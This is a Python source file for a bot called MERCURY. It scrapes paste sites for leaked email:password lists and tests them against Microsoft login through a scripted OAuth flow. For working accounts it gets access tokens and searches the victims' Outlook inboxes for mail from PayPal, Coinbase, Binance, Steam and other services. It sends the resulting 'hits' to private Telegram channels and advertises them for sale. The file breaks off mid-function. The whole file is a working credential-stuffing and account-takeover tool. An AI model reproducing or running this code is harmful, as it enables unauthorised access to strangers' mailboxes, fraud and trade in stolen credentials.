"""
MERCURY — Discord Bot
Scrapes Pasteview every 30 seconds, posts to 3 Discord channels + Telegram.
"""

import asyncio
import io
import json
import logging
import os
import random
import re
import time
from datetime import datetime, timezone
from pathlib import Path

import aiohttp
import concurrent.futures
import uuid
import zipfile

import discord
from discord.ext import commands, tasks
from discord import app_commands
from playwright.async_api import async_playwright

# ─── CONFIG ──────────────────────────────────────────────────────────────────
DISCORD_TOKEN      = os.environ["DISCORD_TOKEN"]
TELEGRAM_TOKEN     = os.environ["TELEGRAM_TOKEN"]
TELEGRAM_CHAT        = os.environ["TELEGRAM_CHAT"]
TELEGRAM_PUBLIC_CHAT  = os.environ["TELEGRAM_PUBLIC_CHAT"]
TELEGRAM_PUBLIC_CHAT2 = os.environ["TELEGRAM_PUBLIC_CHAT2"]
OWNER_ID           = int(os.environ["OWNER_ID"])

CHECK_INTERVAL   = 30
CHECKER_THREADS  = 50
MS_DOMAINS = {"hotmail.com", "hotmail.co.uk", "hotmail.fr", "hotmail.de", "hotmail.it",
              "hotmail.es", "hotmail.nl", "hotmail.be", "hotmail.se", "hotmail.no",
              "hotmail.dk", "hotmail.fi", "hotmail.pt", "hotmail.com.ar", "hotmail.com.br",
              "outlook.com", "outlook.fr", "outlook.de", "outlook.es", "outlook.co.uk",
              "live.com", "live.co.uk", "live.fr", "live.de", "live.nl",
              "msn.com"}
PAGES_TO_SCAN    = 5
ARCHIVE_URL      = "https://pasteview.com/paste-archive"
PASTEDPW_URL     = "https://pasted.pw/recent.php"
SEEN_FILE        = "seen_urls.json"
EMPTY_SCAN_ALERT = 10
KEYWORDS         = ["hotmail", "hits", "mixed"]
BLACKLIST        = ["omegle", "teens", "bro", "sis", "sister", "brother", "incest", "minor", "underage"]

# ─── LOGGING ─────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("mercury")

# ─── STATE ───────────────────────────────────────────────────────────────────
start_time = time.time()
stats      = {"total_pastes": 0, "total_combos": 0, "scans": 0, "empty_scans": 0}
scan_lock  = asyncio.Lock()

private_post_count = 0  # counts private channel posts, public update every 10
recent_filenames   = []  # tracks last 10 posted filenames for public update

# ─── FEATURE TOGGLES ─────────────────────────────────────────────────────────
toggles = {
    "scanning":        True,   # master on/off for scanning
    "telegram":        True,   # post to private telegram
    "telegram_public": True,   # post update message to public telegram
    "owner_dm":        True,   # DM owner on new file
}

def load_seen() -> set:
    if Path(SEEN_FILE).exists():
        try:
            with open(SEEN_FILE) as f:
                return set(json.load(f))
        except Exception:
            pass
    return set()

def save_seen(seen: set):
    try:
        with open(SEEN_FILE, "w") as f:
            json.dump(list(seen), f)
    except Exception as e:
        log.error(f"Failed to save seen URLs: {e}")

posted_urls: set = load_seen()

# ─── CREDENTIAL VALIDATION ───────────────────────────────────────────────────
EMOJI_RE = re.compile(
    "["
    u"\U0001F600-\U0001F64F"
    u"\U0001F300-\U0001F5FF"
    u"\U0001F680-\U0001F9FF"
    u"\U00002600-\U000027BF"
    u"\U0001FA00-\U0001FA6F"
    u"\U0001FA70-\U0001FAFF"
    u"\U00002702-\U000027B0"
    "]+", flags=re.UNICODE
)
JUNK_DOMAINS   = ("t.me", "telegram.me", "discord.gg", "http://", "https://")
VALID_EMAIL_RE = re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")

def is_valid_combo(line: str) -> bool:
    if not line or len(line) > 200 or "|" in line:
        return False
    if EMOJI_RE.search(line) or any(d in line.lower() for d in JUNK_DOMAINS):
        return False
    if ":" not in line:
        return False
    parts = line.split(":", 1)
    email, password = parts[0].strip(), parts[1].strip()
    if not password or len(password) < 3:
        return False
    return bool(VALID_EMAIL_RE.match(email))

def extract_credentials(raw: str) -> list[str]:
    seen, lines = set(), []
    for line in raw.splitlines():
        line = line.strip()
        if line and is_valid_combo(line) and line not in seen:
            seen.add(line)
            lines.append(line)
    return lines


# ─── TELEGRAM ────────────────────────────────────────────────────────────────
async def send_telegram_file(text, filename: str):
    url  = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    data = aiohttp.FormData()
    data.add_field("chat_id", TELEGRAM_CHAT)
    content = text.encode() if isinstance(text, str) else text
    data.add_field("document", content, filename=filename, content_type="application/octet-stream")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data) as resp:
                if resp.status != 200:
                    body = await resp.text()
                    log.error(f"Telegram API error {resp.status}: {body}")
                else:
                    log.info("Posted to Telegram")
    except Exception as e:
        log.error(f"Failed to send to Telegram: {e}")

# ─── BOT ─────────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
bot  = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

async def extract_raw(page, url: str) -> str:
    for attempt in range(2):
        try:
            await page.goto(url, wait_until="networkidle", timeout=15000)
            await page.wait_for_timeout(1500)

            raw = await page.evaluate("""
                () => {
                    if (window.ace) {
                        const editors = document.querySelectorAll('.ace_editor');
                        for (let ed of editors) {
                            try { const v = ace.edit(ed).getValue(); if (v && v.trim()) return v; } catch(e) {}
                        }
                    }
                    return null;
                }
            """)

            if not raw or not raw.strip():
                await page.evaluate("() => { const s = document.querySelector('.ace_scroller'); if (s) s.scrollTop = s.scrollHeight; }")
                await page.wait_for_timeout(800)
                lines = await page.query_selector_all("div.ace_line")
                raw   = "\n".join([(await l.text_content() or "").strip() for l in lines])

            if not raw or not raw.strip():
                pre = await page.query_selector("pre")
                if pre:
                    raw = await pre.text_content()

            if raw and raw.strip():
                return raw

        except Exception as e:
            log.error(f"Extract attempt {attempt+1} failed for {url}: {e}")
            if attempt == 0:
                await asyncio.sleep(2)

    return ""


# ─── INBOX CHECKER ───────────────────────────────────────────────────────────
INBOX_SERVICES = {
    "Facebook":     "security@facebookmail.com",
    "Instagram":    "security@mail.instagram.com",
    "TikTok":       "register@account.tiktok.com",
    "Twitter":      "info@x.com",
    "Netflix":      "info@account.netflix.com",
    "Spotify":      "no-reply@spotify.com",
    "PayPal":       "service@paypal.com.br",
    "Binance":      "do-not-reply@ses.binance.com",
    "Coinbase":     "no-reply@coinbase.com",
    "Steam":        "noreply@steampowered.com",
    "Xbox":         "xboxreps@engage.xbox.com",
    "PlayStation":  "reply@txn-email.playstation.com",
    "Epic Games":   "help@acct.epicgames.com",
    "Amazon":       "auto-confirm@amazon.com",
    "Discord":      "noreply@discord.com",
    "Snapchat":     "no-reply@accounts.snapchat.com",
    "Twitch":       "no-reply@twitch.tv",
    "NordVPN":      "no-reply@nordvpn.com",
    "Revolut":      "no-reply@revolut.com",
    "Uber":         "no-reply@uber.com",
}


def check_inbox_account(combo: str) -> tuple:
    """Login to hotmail and check inbox for service emails. Returns (combo, hits_dict)."""
    import requests, re, uuid, time
    try:
        email, password = combo.split(":", 1)
        session = requests.Session()

        r1 = session.get(
            f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
            headers={
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }, timeout=15)

        if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
            return (combo, {})
        if "MSAccount" not in r1.text:
            return (combo, {})

        time.sleep(0.3)

        r2 = session.get(
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }, allow_redirects=True, timeout=15)

        url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match:
            return (combo, {})

        post_url = url_match.group(1).replace("\\/", "/")
        ppft     = ppft_match.group(1)

        r3 = session.post(post_url,
            data=f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }, allow_redirects=False, timeout=15)

        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
            return (combo, {})
        if any(x in r3.text for x in ["identity/confirm", "Abuse", "signedout", "locked"]):
            return (combo, {})

        location   = r3.headers.get("Location", "")
        if not location:
            return (combo, {})
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return (combo, {})

        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data={
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code_match.group(1),
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }, timeout=15)

        if r4.status_code != 200 or "access_token" not in r4.text:
            return (combo, {})

        access_token = r4.json()["access_token"]
        mspcid = next((c.value for c in session.cookies if c.name == "MSPCID"), str(uuid.uuid4()))
        cid = mspcid.upper()

        hits = {}
        for service_name, sender in INBOX_SERVICES.items():
            try:
                r = requests.post(
                    "https://outlook.live.com/search/api/v2/query",
                    json={"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC",
                          "TextDecorations": "Off",
                          "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                              "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                                              "From": 0, "Query": {"QueryString": f"from:{sender}"},
                                              "Size": 1, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]},
                    headers={"Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"},
                    timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    try:
                        total = data["EntitySets"][0]["ResultSets"][0].get("Total", 0)
                        if total > 0:
                            hits[service_name] = total
                    except Exception:
                        pass
                time.sleep(0.1)
            except Exception:
                continue

        return (combo, hits)

    except requests.exceptions.Timeout:
        return (combo, {})
    except Exception:
        return (combo, {})


def check_valid_account(combo: str) -> tuple:
    """Check if hotmail account is valid. Returns (combo, True/False)."""
    import requests, re, uuid, time
    try:
        email, password = combo.split(":", 1)
        session = requests.Session()

        r1 = session.get(
            f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
            headers={
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }, timeout=15)

        if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
            return (combo, False)
        if "MSAccount" not in r1.text:
            return (combo, False)

        time.sleep(0.3)

        r2 = session.get(
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }, allow_redirects=True, timeout=15)

        url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match:
            return (combo, False)

        post_url = url_match.group(1).replace("\\/", "/")
        ppft     = ppft_match.group(1)

        r3 = session.post(post_url,
            data=f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }, allow_redirects=False, timeout=15)

        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
            return (combo, False)
        if any(x in r3.text for x in ["identity/confirm", "Abuse", "signedout", "locked"]):
            return (combo, False)

        location   = r3.headers.get("Location", "")
        if not location:
            return (combo, False)
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return (combo, False)

        return (combo, True)

    except requests.exceptions.Timeout:
        return (combo, False)
    except Exception:
        return (combo, False)


async def run_validity_checker(combos: list) -> list:
    """Check which accounts are valid. Returns list of valid combos."""
    log.info(f"Checking validity of {len(combos)} hotmail accounts...")
    loop = asyncio.get_event_loop()
    with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
        futures = [loop.run_in_executor(pool, check_valid_account, combo) for combo in combos]
        results = await asyncio.gather(*futures)
    valid = [combo for combo, is_valid in results if is_valid]
    log.info(f"Validity check done — {len(valid)}/{len(combos)} valid")
    return valid


async def run_inbox_checker(combos: list) -> dict:
    """Run inbox checker on all combos. Returns dict of service -> list of combos."""
    log.info(f"Running inbox checker on {len(combos)} combos...")
    loop = asyncio.get_event_loop()
    service_map = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
        futures = [loop.run_in_executor(pool, check_inbox_account, combo) for combo in combos]
        results = await asyncio.gather(*futures)
    for combo, hits in results:
        for service in hits:
            service_map.setdefault(service, []).append(combo)
    log.info(f"Inbox check done — hits in {len(service_map)} service(s): {list(service_map.keys())}")
    return service_map


# ─── PASTED.PW ───────────────────────────────────────────────────────────────
async def scrape_pastedpw(pages: int = 5) -> list[dict]:
    """Scrape pasted.pw recent page using aiohttp."""
    found = []
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
    async with aiohttp.ClientSession(headers=headers) as sess:
        for page_num in range(1, pages + 1):
            url = PASTEDPW_URL if page_num == 1 else f"{PASTEDPW_URL}?page={page_num}"
            try:
                async with sess.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
                    html = await r.text(errors="ignore")
                # Extract paste IDs and titles from anchor tags
                matches = re.findall(r'href="view\.php\?id=(\d+)"[^>]*>\s*([^<]+?)\s*</a>', html)
                for paste_id, title in matches:
                    title = title.strip()
                    if any(k in title.lower() for k in KEYWORDS):
                        if not any(b in title.lower() for b in BLACKLIST):
                            found.append({
                                "title": title,
                                "url": f"https://pasted.pw/view.php?id={paste_id}",
                                "source": "pasted.pw"
                            })
                log.info(f"pasted.pw page {page_num}: {len(found)} match(es) so far")
            except Exception as e:
                log.error(f"pasted.pw page {page_num} failed: {e}")
    return found


async def extract_pastedpw(page, url: str) -> str:
    """Extract combo text from a pasted.pw paste page."""
    for attempt in range(2):
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=20000)
            await page.wait_for_timeout(1500)
            # Try getting text from the paste content area
            raw = await page.evaluate("""
                () => {
                    const pre = document.querySelector('pre');
                    if (pre) return pre.innerText;
                    const ta = document.querySelector('textarea');
                    if (ta) return ta.value;
                    const div = document.querySelector('.paste-content');
                    if (div) return div.innerText;
                    return null;
                }
            """)
            if raw and raw.strip():
                return raw
        except Exception as e:
            log.error(f"pasted.pw extract attempt {attempt+1} failed for {url}: {e}")
            if attempt == 0:
                await asyncio.sleep(2)
    return ""


# ─── BACKGROUND TASK ─────────────────────────────────────────────────────────
@tasks.loop(seconds=CHECK_INTERVAL)
async def monitor_loop():
    if not toggles["scanning"]:
        return

    if scan_lock.locked():
        log.info("Scan already in progress, skipping this cycle")
        return

    async with scan_lock:
        stats["scans"] += 1
        log.info(f"Running scan #{stats['scans']}...")

        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
            )
            page = await browser.new_page()

            try:
                # ── Step 1: load archive ───────────────────────────────────
                for attempt in range(3):
                    try:
                        await page.goto(ARCHIVE_URL, wait_until="networkidle", timeout=30000)
                        await page.wait_for_timeout(2000)
                        break
                    except Exception as e:
                        log.warning(f"Archive load attempt {attempt+1} failed: {e}")
                        if attempt == 2:
                            log.error("Archive failed after 3 attempts, skipping scan")
                            return
                        await asyncio.sleep(3)

                # ── Step 2: scrape pages ───────────────────────────────────
                found = []
                for page_num in range(1, PAGES_TO_SCAN + 1):
                    if page_num > 1:
                        navigated = False
                        buttons   = await page.query_selector_all("button")
                        for btn in buttons:
                            text = await btn.text_content()
                            if text and text.strip().lower() in ["next", ">", "»", "→", "▶"]:
                                disabled  = await btn.get_attribute("disabled")
                                aria_dis  = await btn.get_attribute("aria-disabled")
                                if disabled is not None or aria_dis == "true":
                                    break
                                await btn.click()
                                await page.wait_for_timeout(2000)
                                navigated = True
                                break
                        if not navigated:
                            break

                    matches = await page.evaluate("""
                        (keywords) => {
                            const results = [];
                            for (const a of document.querySelectorAll('a')) {
                                const text = (a.innerText || a.textContent || '').toLowerCase();
                                if (keywords.some(k => text.includes(k))) {
                                    const href = a.href;
                                    if (href
                                        && !href.includes('/paste-archive')
                                        && !href.includes('/new')
                                        && !href.endsWith('/')
                                        && href !== window.location.href) {
                                        results.push({
                                            title: (a.innerText || a.textContent || '').trim().replace(/\\s+/g, ' '),
                                            url: href,
                                            source: 'pasteview'
                                        });
                                    }
                                }
                            }
                            return results;
                        }
                    """, KEYWORDS)
                    log.info(f"Page {page_num}: {len(matches)} match(es)")
                    found.extend(matches)

                # ── Also scrape pasted.pw ─────────────────────────────
                try:
                    pw_found = await scrape_pastedpw(PAGES_TO_SCAN)
                    found.extend(pw_found)
                except Exception as e:
                    log.error(f"pasted.pw scrape failed: {e}")

                # Deduplicate and filter blacklisted titles
                seen_this_run = set()
                pastes        = []
                for item in found:
                    if item["url"] in seen_this_run:
                        continue
                    if any(b in item["title"].lower() for b in BLACKLIST):
                        log.info(f"Skipping blacklisted paste: {item['title']}")
                        continue
                    seen_this_run.add(item["url"])
                    # Ensure source field is preserved
                    if "source" not in item:
                        item["source"] = "pasteview"
                    pastes.append(item)

                stats["total_pastes"] += len(pastes)
                pv_count = sum(1 for p in pastes if p.get("source") == "pasteview")
                pw_count = sum(1 for p in pastes if p.get("source") == "pasted.pw")
                log.info(f"Total pastes: {len(pastes)} (pasteview: {pv_count}, pasted.pw: {pw_count})")

                # ── Step 4: filter new pastes & mark seen ─────────────────
                new_pastes = [p for p in pastes if p["url"] not in posted_urls]
                if not new_pastes:
                    stats["empty_scans"] += 1
                    log.info(f"No new pastes (empty streak: {stats['empty_scans']})")
                    if stats["empty_scans"] == EMPTY_SCAN_ALERT:
                        try:
                            owner = await bot.fetch_user(OWNER_ID)
                            await owner.send(f"⚠️ MERCURY: No new pastes in {EMPTY_SCAN_ALERT} consecutive scans.")
                        except Exception as e:
                            log.error(f"Failed to DM owner: {e}")
                    return

                stats["empty_scans"] = 0
                for p in new_pastes:
                    posted_urls.add(p["url"])
                save_seen(posted_urls)
                log.info(f"{len(new_pastes)} new paste(s) detected")

                # ── Step 6: extract creds & post to channel 3 ─────────────
                try:
                    combined        = []

                    for item in new_pastes[:5]:
                        url = item["url"]
                        log.info(f"Extracting from {url}")
                        if item.get("source") == "pasted.pw":
                            raw = await extract_pastedpw(page, url)
                        else:
                            raw = await extract_raw(page, url)
                        if raw:
                            creds = extract_credentials(raw)
                            if creds:
                                combined.append("\n".join(creds))
                                stats["total_combos"] += len(creds)
                                log.info(f"✓ {len(creds)} valid combos from {url}")
                            else:
                                log.info(f"No valid combos in {url}")
                        else:
                            log.info(f"No content extracted from {url}")


                    if combined:
                        # Flatten all creds
                        all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
                        random.shuffle(all_raw)

                        # Determine label
                        title_lower_check = " ".join(p["title"].lower() for p in new_pastes)
                        if "hotmail" in title_lower_check:
                            label = "hotmail"
                        elif "hits" in title_lower_check:
                            label = "hits"
                        elif "mix" in title_lower_check or "mixed" in title_lower_check:
                            label = "mix"
                        else:
                            label = "content"



                        chunks = [all_raw]
                        log.info(f"{len(all_raw)} combos in 1 file")

                    if combined:
                        # DM owner
                        if toggles["owner_dm"]:
                            try:
                                owner = await bot.fetch_user(OWNER_ID)
                                await owner.send(f"✅ New {label.upper()} detected — {len(all_raw)} combos")
                            except Exception as e:
                                log.error(f"Failed to DM owner: {e}")

                        # Telegram — post all chunks
                        if toggles["telegram"]:
                            tg_header = (
                                f"WAR CLOUD PRIVATE {label.upper()}\n"
                                "------------------------\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                            )
                            for chunk in chunks:
                                fname = f"[ {label.upper()} ] [ {len(chunk)} ] [ @warprivate ].txt"
                                await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                await asyncio.sleep(0.5)

                            # Validity check + inbox checker (hotmail only)
                            if label == "hotmail":
                                try:
                                    # First check which accounts are valid
                                    valid_accounts = await run_validity_checker(all_raw)
                                    if valid_accounts:
                                        # Replace all_raw with only valid accounts
                                        all_raw = valid_accounts
                                        combined = ["\n".join(all_raw)]
                                        chunks = [all_raw]
                                        # Re-post main file with valid only
                                        valid_fname = f"[ HOTMAIL ] [ {len(all_raw)} ] [ VALID ] [ @warprivate ].txt"
                                        await send_telegram_file(tg_header + "\n".join(all_raw), valid_fname)
                                        log.info(f"Posted {len(all_raw)} valid hotmail accounts")
                                    else:
                                        log.info("No valid hotmail accounts found")

                                    # Then run inbox checker on valid accounts only
                                    service_map = await run_inbox_checker(valid_accounts if valid_accounts else all_raw)
                                    if service_map:
                                        zip_buf = io.BytesIO()
                                        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
                                            for service, combos in service_map.items():
                                                zf.writestr(f"{service}.txt", "\n".join(combos))
                                        zip_buf.seek(0)
                                        zip_name = f"[ {label.upper()} ] [ INBOX HITS ] [ @warprivate ].zip"
                                        await send_telegram_file(zip_buf.read(), zip_name)
                                        log.info(f"Posted inbox_hits.zip with {len(service_map)} service(s)")
                                except Exception as e:
                                    log.error(f"Hotmail checker failed: {e}")

                            # Post sorted domains ZIP (hotmail only)
                            if label == "hotmail":
                                try:
                                    domain_map = {}
                                    for combo in all_raw:
                                        try:
                                            domain = combo.split(":", 1)[0].split("@")[-1].lower()
                                            if domain in MS_DOMAINS:
                                                domain_map.setdefault(domain, []).append(combo)
                                        except Exception:
                                            pass
                                    if domain_map:
                                        zip_buf = io.BytesIO()
                                        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
                                            for domain, combos in domain_map.items():
                                                zf.writestr(f"{domain}.txt", "\n".join(combos))
                                        zip_buf.seek(0)
                                        zip_name = f"[ {label.upper()} ] [ SORTED DOMAINS ] [ @warprivate ].zip"
                                        await send_telegram_file(zip_buf.read(), zip_name)
                                        log.info(f"Posted sorted domains ZIP with {len(domain_map)} domain(s)")
                                except Exception as e:
                                    log.error(f"Failed to post domains ZIP: {e}")

                            if toggles["telegram_public"]:
                                private_post_count_ref = globals()
                                private_post_count_ref["private_post_count"] += 1
                                for chunk in chunks:
                                    private_post_count_ref["recent_filenames"].append(f"[ {label.upper()} ] [ {len(chunk)} ] [ @warprivate ].txt")
                                log.info(f"Private post count: {private_post_count_ref['private_post_count']}")
                                if private_post_count_ref["private_post_count"] >= 2:
                                    private_post_count_ref["private_post_count"] = 0
                                    file_list = "\n".join(f"  • {fn}" for fn in private_post_count_ref["recent_filenames"])
                                    private_post_count_ref["recent_filenames"] = []
                                    pub_text = f"PRIVATE CLOUD UPDATED !\n\nFiles added:\n{file_list}\n\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
                                    promo_path = os.path.join("/app", "promo.png")
                                    async with aiohttp.ClientSession() as sess:
                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT, TELEGRAM_PUBLIC_CHAT2]:
                                            try:
                                                if os.path.exists(promo_path):
                                                    form = aiohttp.FormData()
                                                    form.add_field("chat_id", pub_chat)
                                                    form.add_field("caption", pub_text)
                                                    with open(promo_path, "rb") as img:
                                                        form.add_field("photo", img.read(), filename="promo.png", content_type="image/png")
                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", data=form)
                                                    body = await resp.json()
                                                    if not body.get("ok"):
                                                        log.error(f"Telegram sendPhoto failed: {body}")
                                                    else:
                                                        log.info(f"Posted public update with image to {pub_chat}")
                                                else:
                                                    log.warning(f"promo.png not found at {promo_path}, sending text only")
                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                                        json={"chat_id": pub_chat, "text": pub_text})
                                                    body = await resp.json()
                                                    if not body.get("ok"):
                                                        log.error(f"Telegram sendMessage failed: {body}")
                                                    else:
                                                        log.info(f"Posted public update to {pub_chat}")
                                            except Exception as e:
                                                log.error(f"Failed to post public update to {pub_chat}: {e}")


                    else:
                        log.info("Nothing to post to content channel")

                except Exception as e:
                    log.error(f"Could not post to content channel: {e}")

            except Exception as e:
                log.error(f"Monitor loop error: {e}")
                stats["empty_scans"] += 1
            finally:
                await browser.close()


@monitor_loop.before_loop
async def before_monitor():
    await bot.wait_until_ready()


@tasks.loop(seconds=60)
async def watchdog():
    """Restart monitor loop if it dies."""
    if not monitor_loop.is_running():
        log.warning("Monitor loop was dead, restarting...")
        monitor_loop.start()


@watchdog.before_loop
async def before_watchdog():
    await bot.wait_until_ready()

# ─── SLASH COMMANDS ───────────────────────────────────────────────────────────
@tree.command(name="scrape", description="Manually trigger a scrape right now")
@app_commands.describe(pages="Number of archive pages to scan (default: 5)")
async def cmd_scrape(interaction: discord.Interaction, pages: int = PAGES_TO_SCAN):
    await interaction.response.send_message(f"🔴 Scanning {pages} page(s)...", ephemeral=True)
    await monitor_loop()
    await interaction.followup.send("✅ Done.", ephemeral=True)


@tree.command(name="toggle", description="Enable or disable a bot feature")
@app_commands.describe(feature="Feature to toggle")
@app_commands.choices(feature=[
    app_commands.Choice(name="scanning",        value="scanning"),
    app_commands.Choice(name="telegram",        value="telegram"),
    app_commands.Choice(name="telegram_public", value="telegram_public"),
    app_commands.Choice(name="owner_dm",        value="owner_dm"),
])
async def cmd_toggle(interaction: discord.Interaction, feature: str):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ Only the owner can use this.", ephemeral=True)
        return
    toggles[feature] = not toggles[feature]
    state = "✅ ON" if toggles[feature] else "❌ OFF"
    await interaction.response.send_message(f"`{feature}` is now {state}", ephemeral=True)


@tree.command(name="toggles", description="Show current status of all toggles")
async def cmd_toggles(interaction: discord.Interaction):
    lines = [f"{'✅' if v else '❌'} `{k}`" for k, v in toggles.items()]
    await interaction.response.send_message("\n".join(lines), ephemeral=True)



@tree.command(name="stats", description="Show bot stats")
async def cmd_stats(interaction: discord.Interaction):
    uptime_secs      = int(time.time() - start_time)
    hours, remainder = divmod(uptime_secs, 3600)
    minutes, seconds = divmod(remainder, 60)
    embed = discord.Embed(title="MERCURY // STATS", color=0xCC0000, timestamp=datetime.now(timezone.utc))
    embed.add_field(name="Uptime",       value=f"{hours}h {minutes}m {seconds}s", inline=True)
    embed.add_field(name="Scans Run",    value=str(stats["scans"]),               inline=True)
    embed.add_field(name="Pastes Found", value=str(stats["total_pastes"]),        inline=True)
    embed.add_field(name="Combos Found", value=str(stats["total_combos"]),        inline=True)
    embed.add_field(name="URLs Tracked", value=str(len(posted_urls)),             inline=True)
    embed.add_field(name="Check Every",  value=f"{CHECK_INTERVAL}s",             inline=True)
    await interaction.response.send_message(embed=embed)

# ─── EVENTS ──────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    log.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
    try:
        synced = await tree.sync()
        log.info(f"Synced {len(synced)} slash command(s)")
    except Exception as e:
        log.error(f"Failed to sync commands: {e}")

    # Delete Telegram webhook so it doesnt process channel messages
    try:
        async with aiohttp.ClientSession() as sess:
